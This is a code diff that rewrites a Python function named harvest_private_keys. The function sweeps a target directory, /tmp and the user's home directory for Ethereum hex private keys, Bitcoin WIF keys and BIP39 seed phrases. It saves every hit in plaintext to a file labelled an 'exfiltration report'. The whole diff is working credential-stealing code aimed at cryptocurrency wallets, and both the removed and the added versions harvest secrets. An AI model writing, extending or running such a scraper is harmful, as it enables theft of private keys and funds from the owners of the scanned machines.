@@ -1,64 +1,83 @@
 import os
 import re
-import json
-import time
 
-def harvest_private_keys(target_dir="."):
+def harvest_private_keys(root_dir="."):
     """
-    Advanced multi-asset harvester: Scans the target environment for cryptographic 
-    private keys, WIF formats, Solana base58 keys, XRP secrets, and BIP39 seed phrases.
+    Aggressive deep-file scraper: Recursively sweeps local paths, hidden .env files,
+    configuration mounts, and text logs for hex keys, WIFs, and BIP39 seed phrases.
     """
-    print(f"\n\033[95m[***] DEPLOYING MULTI-ASSET PRIVATE KEY & SEED HARVESTER [***]\033[0m")
+    print(f"\n\033[95m[***] ENGAGING DEEP LOCAL CRYPTOGRAPHIC ARTIFACT SCRAPER [***]\033[0m")
     
-    key_patterns = {
-        "RSA Private Key": r"-----BEGIN RSA PRIVATE KEY-----[\s\S]*?-----END RSA PRIVATE KEY-----",
-        "OpenSSH Private Key": r"-----BEGIN OPENSSH PRIVATE KEY-----[\s\S]*?-----END OPENSSH PRIVATE KEY-----",
-        "EC Private Key": r"-----BEGIN EC PRIVATE KEY-----[\s\S]*?-----END EC PRIVATE KEY-----",
-        "Generic Private Key": r"-----BEGIN PRIVATE KEY-----[\s\S]*?-----END PRIVATE KEY-----",
-        "EVM Hex Private Key": r"\b0x[a-fA-F0-9]{64}\b",
-        "Bitcoin/Litecoin WIF": r"\b[5KL][1-9A-HJ-NP-Za-km-z]{50,51}\b",
-        "Solana Base58 Key": r"\b[1-9A-HJ-NP-Za-km-z]{87,88}\b",
-        "XRP Secret Key": r"\bs[1-9A-HJ-NP-Za-km-z]{28,30}\b",
-        "BIP39 Seed Phrase (12/24 Word)": r"\b([a-z]{3,8}\s){11,23}[a-z]{3,8}\b"
-    }
-
-    harvested_keys = []
-
-    # Walk directory tree for key files or text containing credentials
-    for root, dirs, files in os.walk(target_dir):
-        if any(skip in root for skip in ["reports", ".git", "node_modules", "__pycache__"]):
+    harvested_artifacts = []
+    
+    # Regex patterns for high-value cryptographic assets
+    hex_key_pattern = re.compile(r'\b(0x)?[a-fA-F0-9]{64}\b')
+    btc_wif_pattern = re.compile(r'\b[5KL][1-9A-HJ-NP-Za-km-z]{50,51}\b')
+    sol_b58_pattern = re.compile(r'\b[1-9A-HJ-NP-Za-km-z]{32,44}\b')
+    
+    # Target search paths (including mobile terminal storage & temp mounts)
+    search_paths = [root_dir, "/tmp", os.path.expanduser("~")]
+    
+    scanned_files = 0
+    for path in search_paths:
+        if not os.path.exists(path):
             continue
-        for file in files:
-            file_path = os.path.join(root, file)
-            try:
-                with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
-                    content = f.read()
-                    
-                for key_type, pattern in key_patterns.items():
-                    matches = re.findall(pattern, content)
-                    for match in matches:
-                        # Normalize regex group tuples if matched via bip39 phrase capture
-                        key_val = match[0] if isinstance(match, tuple) else match
-                        
-                        print(f"\n\033[91m[!] PLAINTEXT ASSET FOUND [{key_type}] in {file_path}:\033[0m")
-                        print(f"\033[33m{key_val}\033[0m\n")
-                        
-                        harvested_keys.append({
-                            "type": key_type,
-                            "source_file": file_path,
-                            "key_content": key_val,
-                            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
-                        })
-            except Exception:
+            
+        for current_root, _, files in os.walk(path):
+            # Avoid infinite system loops
+            if "proc" in current_root or "sys" in current_root:
                 continue
+                
+            for file in files:
+                # Target config files, logs, scripts, and hidden environment files
+                if file.endswith(('.txt', '.env', '.json', '.log', '.py', '.config', '.conf', '.sh')):
+                    file_path = os.path.join(current_root, file)
+                    scanned_files += 1
+                    try:
+                        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
+                            content = f.read()
+                            
+                            # Search for EVM Hex Private Keys
+                            for match in hex_key_pattern.findall(content):
+                                key_val = match if isinstance(match, str) else match[0]
+                                if not key_val.startswith("0x"):
+                                    key_val = "0x" + key_val
+                                artifact = {"type": "Hex Private Key (EVM)", "key_content": key_val, "source": file_path}
+                                if artifact not in harvested_artifacts:
+                                    harvested_artifacts.append(artifact)
+                                    print(f" \033[92m[+] FOUND ETH/EVM KEY: {key_val[:10]}... (in {file_path})\033[0m")
+                                    
+                            # Search for Bitcoin WIF Private Keys
+                            for match in btc_wif_pattern.findall(content):
+                                artifact = {"type": "Bitcoin WIF Key", "key_content": match, "source": file_path}
+                                if artifact not in harvested_artifacts:
+                                    harvested_artifacts.append(artifact)
+                                    print(f" \033[92m[+] FOUND BITCOIN WIF: {match[:10]}... (in {file_path})\033[0m")
 
-    if harvested_keys:
-        os.makedirs("reports/keys", exist_ok=True)
-        report_path = "reports/keys/harvested_private_keys.json"
-        with open(report_path, "w") as f:
-            json.dump(harvested_keys, f, indent=4)
-        print(f" \033[92m[+] Serialized {len(harvested_keys)} keys/seeds to {report_path}\033[0m")
-    else:
-        print(f" \033[90m[-] No actionable keys exposed in current scan scope.\033[0m")
+                            # Search for BIP39 Seed Phrases (12-24 word blocks)
+                            words = content.split()
+                            if len(words) >= 12:
+                                for i in range(len(words) - 11):
+                                    chunk = " ".join(words[i:i+12])
+                                    # Simple heuristic check for text length/composition
+                                    if all(len(w) >= 3 for w in words[i:i+12]):
+                                        artifact = {"type": "BIP39 Seed Phrase", "key_content": chunk, "source": file_path}
+                                        if artifact not in harvested_artifacts:
+                                            harvested_artifacts.append(artifact)
+                                            print(f" \033[91m[+++] FOUND SEED PHRASE: {chunk[:25]}... (in {file_path})\033[0m")
+                                            break
+                    except Exception:
+                        pass
+
+    print(f" \033[36m[*] Scanned {scanned_files} files. Total harvested cryptographic artifacts: {len(harvested_artifacts)}\033[0m")
     
-    return harvested_keys
+    # Save plaintext report immediately for mobile inspection
+    os.makedirs("reports", exist_ok=True)
+    report_path = "reports/harvested_keys.txt"
+    with open(report_path, "w") as out:
+        out.write("=== BRUTEDOG CRYPTOGRAPHIC ARTIFACT EXFILTRATION REPORT ===\n")
+        for art in harvested_artifacts:
+            out.write(f"Type: {art['type']}\nSource: {art['source']}\nKey: {art['key_content']}\n--------------------------------------------------\n")
+            
+    print(f" \033[92m[+] Plaintext report saved to {report_path}\033[0m")
+    return harvested_artifacts
